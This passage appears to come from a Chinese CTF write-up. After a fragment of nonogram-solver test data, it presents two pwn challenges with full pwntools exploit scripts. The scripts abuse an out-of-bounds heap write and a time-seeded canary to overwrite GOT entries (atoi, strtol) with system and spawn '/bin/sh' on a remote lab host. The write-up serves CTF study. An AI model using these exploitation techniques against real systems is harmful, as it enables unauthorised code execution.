),(1,3,1,4,1,2),(1,2,3,1,1),(2,1,3,1),(1,1,2,2),(2,2,1),(2,2,2),(2,2,2),(4,3),(7,)] 
#test_cols = [[7, 1, 1, 1, 5, 7], [1, 1, 1, 1, 2, 2, 1, 1], [1, 3, 1, 2, 3, 4, 1, 3, 1], [1, 3, 1, 1, 1, 3, 1, 1, 3, 
1], [1, 3, 1, 1, 2, 1, 1, 1, 3, 1], [1, 1, 2, 2, 1, 1, 1], [7, 1, 1, 1, 1, 1, 1, 1, 7], [1, 2, 2, 2], [1, 1, 2, 3, 1, 4,    
1  , 5], [4, 5, 2, 3, 2], [1, 3, 1, 1, 1, 2, 1, 1], [3, 3, 3, 3], [1, 1, 3, 1, 1, 2, 1, 1, 2, 1], [2, 1, 3, 3], [1, 3, 
1, 1, 2, 1, 1, 2, 1, 1], [1, 2, 2, 1, 3, 7, 3], [1, 1, 1, 1, 2, 1, 1, 1, 2], [2, 2, 1, 2, 1, 1, 2, 1], [2, 3, 1, 1, 1, 
1, 2, 1, 1], [1, 1, 2, 1, 2, 4, 1], [3, 1, 4, 1, 1, 1, 8], [1, 3, 1, 1, 2, 3, 1], [7, 2, 1, 1, 1], [1, 1, 1, 1, 1, 1, 2, 
2, 2], [1, 3, 1, 3, 1, 1, 1, 6, 1], [1, 3, 1, 3, 1, 1, 1, 1, 1, 1, 1], [1, 3, 1, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1], [1, 1, 
1, 1, 1, 1, 1, 1, 2, 3], [7, 1, 1, 1, 1, 1, 1]] 
#test_rows = [[7, 1, 3, 1, 7], [1, 1, 2, 2, 2, 1, 1], [1, 3, 1, 3, 1, 1, 1, 1, 1, 3, 1], [1, 3, 1, 2, 1, 1, 1, 1, 3, 
1], [1, 3, 1, 1, 4, 4, 1, 3, 1], [1, 1, 1, 1, 3, 1, 1, 1], [7, 1, 1, 1, 1, 1, 1, 1, 7], [2, 1], [5, 5, 1, 4, 3, 1, 1, 1], 
[1, 1, 2, 3, 3, 1], [1, 2, 2, 2, 2, 2, 4], [1, 1, 1, 3, 1, 1, 1, 2, 2], [1, 1, 2, 1, 1, 1, 1, 1, 3], [3, 1, 4, 1, 2, 2, 
1], [1, 1, 1, 2, 3, 1, 2], [2, 1, 1, 2, 3, 1], [2, 1, 4, 1, 3, 1, 1, 3], [1, 4, 1, 1, 2, 1, 1], [1, 2, 1, 1, 2, 1, 2, 3], 
[1, 1, 1, 2, 1, 2, 5, 1], [1, 3, 2, 3, 3, 8], [3, 4, 3, 1, 1], [7, 2, 3, 3, 1, 1, 2], [1, 1, 1, 2, 2, 2, 1], [1, 3, 1, 2, 
1, 1, 2, 5, 1, 1], [1, 3, 1, 2, 2, 2, 1, 1], [1, 3, 1, 1, 2, 1, 4, 4], [1, 1, 1, 1, 3, 1, 1, 1], [7, 1, 2, 3, 1, 1, 2]] 
#test_cols = [[7, 3, 4, 7], [1, 1, 3, 1, 1, 1], [1, 3, 1, 3, 3, 1, 3, 1], [1, 3, 1, 3, 1, 1, 3, 1], [1, 3, 1, 3, 1, 2, 
1, 3, 1], [1, 1, 2, 1, 1, 1, 1], [7, 1, 1, 1, 1, 1, 7], [3], [1, 2, 1, 2, 3, 2, 2], [1, 3, 1, 1, 2], [2, 1, 2, 3, 1, 3], 
[1, 2, 2, 2, 1, 2, 1, 2], [2, 3, 2, 1, 1, 2, 1], [2, 2, 3, 1, 1, 2, 3, 1], [2, 3, 7, 1, 2], [2, 1, 1, 1, 1, 3], [3, 2, 2, 
1, 1, 5, 3], [1, 1, 2, 1], [7, 2, 3, 1, 1, 3, 1], [1, 1, 3, 2, 1, 1], [1, 3, 1, 3, 1, 9], [1, 3, 1, 1, 5, 1, 1], [1, 3, 
1, 3, 1, 2, 2], [1, 1, 5, 1, 1, 1, 2], [7, 9, 7]] 
#test_rows = [[7, 1, 2, 2, 7], [1, 1, 1, 5, 1, 1], [1, 3, 1, 1, 3, 1, 1, 3, 1], [1, 3, 1, 2, 1, 3, 1], [1, 3, 1, 3, 
1, 1, 3, 1], [1, 1, 3, 1, 1], [7, 1, 1, 1, 1, 1, 7], [1, 2, 4], [2, 2, 1, 1, 3, 1, 1], [2, 3, 1, 2, 1, 1, 1, 2], [10, 1, 
2, 2, 3], [1,    1   , 1, 1, 3, 3], [1, 5, 2, 1, 7], [1, 2, 1, 1, 1, 1, 1, 2], [3, 1, 1, 4, 2, 1], [1, 1, 2, 1, 5, 1, 
1, 2], [1, 1, 1, 1, 3, 1, 7, 1], [1, 1, 2, 1, 1, 1], [7, 3, 2, 1, 1, 1], [1, 1, 1, 2, 2, 2], [1, 3, 1, 1, 2, 8, 1, 1], 
[1, 3, 1, 1, 1, 2, 1, 1, 1], [1, 3, 1, 2, 2, 1, 3, 2], [1, 1, 4, 1, 2, 1, 3], [7, 1, 2, 2, 1, 1, 3, 1]] 
test_cols = [[7,2, 1, 1, 7], [1, 1, 1, 1, 1, 1, 1, 1], [1, 3, 1, 1, 2, 1, 1, 3, 1], [1, 3, 1, 1, 3, 1, 3, 1], [1, 3, 
1, 3, 1, 1, 1, 3, 1], [1, 1, 2, 2, 1, 1], [7, 1, 1, 1, 1, 1, 7], [1, 1, 1, 2], [4, 2, 1, 2, 1, 1, 2, 2], [2, 1, 1, 1, 1, 
2, 1, 2, 1, 1], [3, 2, 1, 2, 4, 1], [2, 1, 4, 1, 1, 1, 1, 1], [1, 1, 5, 6, 3, 2], [2, 1, 1, 1, 1, 5, 1, 2], [5, 1, 7, 4, 
2], [1, 3, 1, 3, 1], [1, 2, 1, 2, 8, 2], [3, 1, 2, 3, 1], [7, 1, 2, 1, 1, 2, 1], [1, 1, 5, 3, 1, 1], [1, 3, 1, 1, 8, 1], 
[1, 3, 1, 5, 3, 1, 2], [1, 3, 1, 1, 3, 3, 2, 3], [1, 1, 1, 1, 2, 2, 3], [7, 1, 2, 2, 1, 1]] 
test_rows =   [[7, 2, 1, 1, 7], [1, 1, 4, 4, 1, 1], [1, 3, 1, 1, 5, 1, 3, 1], [1, 3, 1, 3, 1, 1, 1, 3, 1], [1, 3, 1, 
2, 1, 1, 1, 3, 1], [1, 1, 3, 2, 1, 1], [7, 1, 1, 1, 1, 1, 7], [1, 3], [2, 3, 3, 1, 1, 4], [1, 3, 2, 1, 1, 6], [2, 1, 1, 
1, 5, 1, 2], [1, 2, 2, 1, 1, 4], [2, 1, 1, 6, 2, 2, 1], [5, 3, 1, 1, 3, 1, 1], [1, 1, 1, 5, 2, 2], [2, 2, 2, 2, 4, 1], 
[3, 3, 5, 7, 1], [3, 3, 1, 2, 1], [7, 2, 4, 1, 1, 1], [1, 1, 3, 1, 3, 1, 1], [1, 3, 1, 2, 3, 6, 1], [1, 3, 1, 1, 1, 1, 2, 
1, 1], [1, 3, 1, 1, 1, 2, 2], [1, 1, 1, 2, 2, 2, 3], [7, 2, 3, 1, 5]] 
go(test_cols,test_rows) 
# remove duplicates with 
# fdupes -rdN . 
# turn it into a gif with 
# convert -delay 10 -loop 0 nonogram*.png anim.gif 
Crypto&Exploit400(Pwn-1) 
用 IDA 分析程序，发现程序内部自己实现了一个内存管理系统。和 LIBC 的堆有些相似，
连续申请的内存会在相邻的地址。 
经过分析，发现漏洞出在 Update 与 Query 的时候，可以越过数组界限读写 4 个字节，于是
修改相邻数组的开头(开头为数组包含数字总和)，可以达到任意写的效果。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import * 
from ctypes import * 
local = False 
if local: 
io = process('./pwn1') 
else: 
atoi_offset = 0x2D8E0 
system_offset = 0x3BC90 
io = remote('pwn.lab.seclover.com',11111) 
def r_sort(io,numbers): 
io.recvuntil('$ ') 
io.sendline('sort') 
io.recvuntil(':') 
io.sendline(str(len(numbers))) 
for i in numbers: 
io.recvuntil(':') 
io.sendline(str(i)) 
def main(): 
# leak heap base 
r_sort(io,[1]) 
print io.recvuntil('Choose:') 
io.sendline('3') 
print io.recvuntil('Choose:') 
io.sendline('1') 
print io.recvuntil('index:') 
io.sendline('1') 
io.recvuntil('result: ') 
heap_base = int(io.recvline()[:-1]) 
log.success('Heap Base = ' + hex(heap_base)) 
io.recvuntil('Choose:') 
io.sendline('7') 
io.recvuntil('$ ') 
io.sendline('clear') 
# now: 
# [8|8|xxxxxx] 
r_sort(io,[1,2,3]) 
io.recvuntil('Choose:') 
io.sendline('3') 
io.recvuntil('Choose:') 
io.sendline('7') 
r_sort(io,[1,2,3,4,5,6,7]) 
io.recvuntil('Choose:') 
io.sendline('3') 
io.recvuntil('Choose:') 
io.sendline('7') 
io.recvuntil('$ ') 
io.sendline('clear') 
r_sort(io,[1,2,3,4,5,6,7]) 
io.recvuntil('Choose:') 
io.sendline('3') 
io.recvuntil('Choose:') 
io.sendline('7') 
r_sort(io,[1,2,3]) 
io.recvuntil('Choose:') 
io.sendline('2') 
io.recvuntil(':') 
io.sendline('3') 
io.recvuntil(':') 
io.sendline('1073741832') 
io.recvuntil('Choose:') 
io.sendline('7') 
io.recvuntil('$ ') 
io.sendline('reload') 
io.recvuntil(':') 
io.sendline('0') 
addr = heap_base + 0x40 
atoi_plt = c_uint32(0x804d020) 
atoi_plt.value -= addr 
atoi_plt.value /= 4 
atoi_plt.value -= 1 
log.success('Index = '+str(atoi_plt.value)) 
io.recvuntil('Choose:') 
io.sendline('1') 
io.recvuntil('index:') 
io.sendline(str(atoi_plt.value)) 
io.recvuntil('result: ') 
atoi_addr = c_uint32(int(io.recvline()[:-1])) 
log.success('Atoi addr = ' + hex(atoi_addr.value)) 
libc_addr = atoi_addr.value - atoi_offset 
log.success('Libc addr = ' + hex(libc_addr)) 
system_addr = c_int32(libc_addr + system_offset) 
io.recvuntil('Choose:') 
io.sendline('2') 
io.recvuntil(':') 
io.sendline(str(atoi_plt.value)) 
io.recvuntil(':') 
io.sendline(str(system_addr.value)) 
io.recvuntil('Choose:') 
io.sendline('/bin/sh') 
#raw_input('attach!') 
io.interactive() 
return 0 
if __name__ == '__main__': 
main() 
效果： 
Crypto&Exploit600(Pwn-2) 
这道题目是 pwn 400 的延伸，程序在分配数组时多分配了一个 dword 用作 canary 以防
止我们修改数组长度。canary 是以 time(0)作 seed 产生的伪随机数，又因为两道题目运行在
同一个服务器上，所以我想到了和服务器同步时间以得到 canary。利用 pwn400 的脚本将系
统时间同步，然后利用和 pwn400 相似的方法即可 get shell，拿到 flag。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import * 
from ctypes import * 
def r_sort(io,numbers): 
io.recvuntil('$ ') 
io.sendline('sort') 
io.recvuntil(':') 
io.sendline(str(len(numbers))) 
for i in numbers: 
io.recvuntil(':') 
io.sendline(str(i)) 
def get_random(delta=0): 
libc = CDLL('libc.so.6') 
seed = libc.time(0) + delta 
libc.srand(seed) 
return c_uint32(libc.rand()) 
def main(): 
delta = 0 
while 1: 
local = False 
if local: 
io = process('./pwn2') 
random = get_random(delta) 
strtol_offset = 0x305B0 
atoi_offset = 0x2D8E0 
system_offset = 0x30240 
else: 
io = remote('pwn.lab.seclover.com',22222) 
random = get_random(delta) 
strtol_offset = 0x305B0 
atoi_offset = 0x2D8E0 
system_offset = 0x3BC90 
log.info('Random = ' + str(random)) 
canary = c_int32(0x40000008^random.value).value 
if canary < 0x40000008: 
log.info('Canary Less than Length! Retry') 
io.close() 
continue 
r_sort(io,[0x40000008,canary,0x7fffffff,0x7fffffff,0x7fffffff,0x7
fffffff]) 
io.recvuntil('Choose:') 
io.sendline('3') 
io.recvuntil('Choose:') 
io.sendline('1') 
io.recvuntil('index:') 
io.sendline('6') 
io.recvuntil('result: ') 
heap_base = int(io.recvline()[:-1]) 
log.success('Heap Base = ' + hex(heap_base)) 
fake_array = heap_base + 8 
io.recvuntil('Choose:') 
io.sendline('2') 
io.recvuntil(':') 
io.sendline('6') 
io.recvuntil(':') 
io.sendline(str(fake_array)) 
io.recvuntil('Choose:') 
io.sendline('7') 
io.recvuntil('$ ') 
io.sendline('reload') 
io.recvuntil(':') 
io.sendline('0') 
#raw_input('Attach now!') 
io.recvuntil('Choose:') 
io.sendline('1') 
io.recvuntil(':') 
io.sendline('0') 
io.recv(9999) 
result = io.recv(9999) 
print result 
if 'Overwrite' not in result: 
log.success("Delta found !" + str(delta)) 
# calc index 
strtol_got = 0x0804C01C 
index = c_uint32(c_uint32(strtol_got-
(fake_array+8)).value/4).value-8 
log.info("Index " + str(index)) 
io.sendline('1') 
print io.recvuntil(':') 
io.sendline(str(index)) 
print io.recvuntil('result: ') 
strtol_addr = c_uint32(int(io.recvline()[:-1])) 
log.success('strtol addr = ' + hex(strtol_addr.value)) 
#raw_input("attach!") 
libc_addr = strtol_addr.value - strtol_offset 
log.success('Libc addr = ' + hex(libc_addr)) 
system_addr = libc_addr + system_offset 
io.sendline('2') 
io.recvuntil(':') 
io.sendline(str(index)) 
io.recvuntil(':') 
io.sendline(str(c_int32(system_addr).value)) 
io.recvuntil('Choose:') 
io.sendline('/bin/sh') 
io.interactive() 
exit(0) 
#io.interactive() 
io.close() 
return 0 
if __name__ == '__main__': 
main() 